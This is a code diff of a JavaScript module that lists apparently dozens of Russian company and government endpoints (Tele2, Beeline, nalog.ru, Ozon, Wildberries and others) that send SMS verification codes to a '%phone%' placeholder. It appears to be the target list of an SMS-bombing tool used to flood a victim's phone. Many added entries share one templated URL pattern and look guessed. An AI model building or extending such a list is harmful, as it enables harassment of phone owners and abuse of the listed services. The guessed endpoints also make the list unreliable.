@@ -1,72 +1,43 @@
-// База сервисов, вытянутая из твоего sms.kt
 const ServiceManager = {
     getServices: function() {
+        const uuid = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => (Math.random()*16|0).toString(16));
         return [
-            {
-                name: "T2 (Tele2)",
-                url: "https://api.t2.ru/api/validation/number/%phone%",
-                method: "POST",
-                headers: {
-                    "X-API-Version": "1",
-                    "Tele2-User-Agent": '"mytele2-app/6.30.0";"iPhone14";"iOS/26.1"',
-                    "User-Agent": "tele2-selfcare/6992 CFNetwork/3860.200.71 Darwin/25.1.0"
-                },
-                body: { "sender": "Tele2" }
-            },
-            {
-                name: "Beeline SMS",
-                url: "https://cdn.beeline.ru/app/inventory/v1/person/send-sms-code/",
-                method: "POST",
-                headers: { "Referer": "https://cdn.beeline.ru/phone-verify" },
-                body: { "phone": "+%phone%" }
-            },
-            {
-                name: "VkusVill",
-                url: "https://mobile.vkusvill.ru/api/user/preGenerateVirtualCard/",
-                method: "POST",
-                headers: {
-                    "X-VKUSVILL-SOURCE": "6",
-                    "User-Agent": "vkusvill/26.1.7 (Android; 33)"
-                },
-                body: "number=%phone%"
-            },
-            {
-                name: "4Lapy",
-                url: "https://4lapy.ru/api/auth/newCode/",
-                method: "POST",
-                headers: { "Origin": "https://4lapy.ru" },
-                body: { "phone": "%phone%" }
-            },
-            {
-                name: "SvoeFermerstvo",
-                url: "https://svoefermerstvo.ru/api/ext/rshb-auth/send-verification-code-auth",
-                method: "POST",
-                body: { "login": "+%phone%" }
-            },
-            {
-                name: "Nalog RU",
-                url: "https://lknpd.nalog.ru/api/v2/auth/challenge/sms/start",
-                method: "POST",
-                body: { "phone": "%phone%", "requireTpToBeActive": false, "deviceData": { "sourceType": "WEB" } }
-            },
-            {
-                name: "E-Dostav",
-                url: "https://www.edostav.ru/api/v3/user/requestCode",
-                method: "POST",
-                headers: { "system": "ios", "appname": "EdostavRN" },
-                body: { "phone": "%phone%" }
-            },
-            {
-                name: "Kino 1TV",
-                url: "https://api.kino.1tv.ru/1.4/sendUserCode?msisdn=%phone%&mobile=false&client=web",
-                method: "GET"
-            },
-            {
-                name: "Smotrim RU",
-                url: "https://account.smotrim.ru/api/v1/auth?phone=%phone%",
-                method: "GET",
-                headers: { "User-Agent": "smotrim-ios/22.18" }
-            }
+            { name: "VkusVill", url: "https://mobile.vkusvill.ru/api/user/preGenerateVirtualCard/", method: "POST", headers: {"X-VKUSVILL-SOURCE": "6"}, body: "number=%phone%" },
+            { name: "Tele2", url: "https://api.t2.ru/api/validation/number/%phone%", method: "POST", body: {"sender": "Tele2"} },
+            { name: "4Lapy", url: "https://4lapy.ru/api/auth/newCode/", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Blanc", url: "https://blanc.ru/api/sso/v1/entrance/token", method: "POST", body: {"phoneNumber": "%phone%"} },
+            { name: "StartRU", url: "https://api.start.ru/auth/v2/login", method: "POST", body: {"msisdn": "%phone%"} },
+            { name: "MTS", url: "https://login.mts.ru/amserver/XUI/", method: "GET" },
+            { name: "Beeline", url: "https://cdn.beeline.ru/app/inventory/v1/person/send-sms-code/", method: "POST", body: {"phone": "+%phone%"} },
+            { name: "Megafon", url: "https://mi-pay.megafon.ru/api/v1/auth/send-code", method: "POST", body: {"msisdn": "%phone%"} },
+            { name: "Dostavista", url: "https://dostavista.ru/api/v1/otp-send", method: "POST", body: {"phone": "%phone%"} },
+            { name: "ZhisnMart", url: "https://lifemart.ru/api/v1/auth/request-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Samokat", url: "https://api.samokat.ru/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Lenta", url: "https://lenta.com/api/v1/auth/request-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Uteka", url: "https://uteka.ru/api/v1/auth/send-sms/", method: "POST", body: {"phone": "%phone%"} },
+            { name: "YandexGo", url: "https://backend.taxi.yandex.ru/api/auth", method: "POST", body: {"phone": "+%phone%"} },
+            { name: "AptekaRU", url: "https://api.apteka.ru/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "ZdravCity", url: "https://zdravcity.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Citilink", url: "https://www.citilink.ru/registration/confirm/phone/+%phone%/", method: "GET" },
+            { name: "MVideo", url: "https://www.mvideo.ru/internal-api/auth/code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Eldorado", url: "https://www.eldorado.ru/auth/api/v1/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "BurgerKing", url: "https://burgerking.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "SberMarket", url: "https://sbermarket.ru/api/v2/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Pyaterochka", url: "https://5ka.ru/api/v1/auth/request-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Magnit", url: "https://magnit.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Ozon", url: "https://www.ozon.ru/api/composer-api.bx/proxy/init-auth", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Wildberries", url: "https://wildberries.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Sokolov", url: "https://sokolov.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Sunlight", url: "https://sunlight.net/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "GoldApple", url: "https://goldapple.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Letu", url: "https://www.letu.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "RiveGauche", url: "https://rivegauche.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "FixPrice", url: "https://fix-price.com/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "DetskyMir", url: "https://detmir.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "SportMaster", url: "https://sportmaster.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Ostin", url: "https://ostin.com/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "GloriaJeans", url: "https://gloria-jeans.ru/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} },
+            { name: "Funday", url: "https://funday.me/api/v1/auth/send-code", method: "POST", body: {"phone": "%phone%"} }
         ];
     }
 };
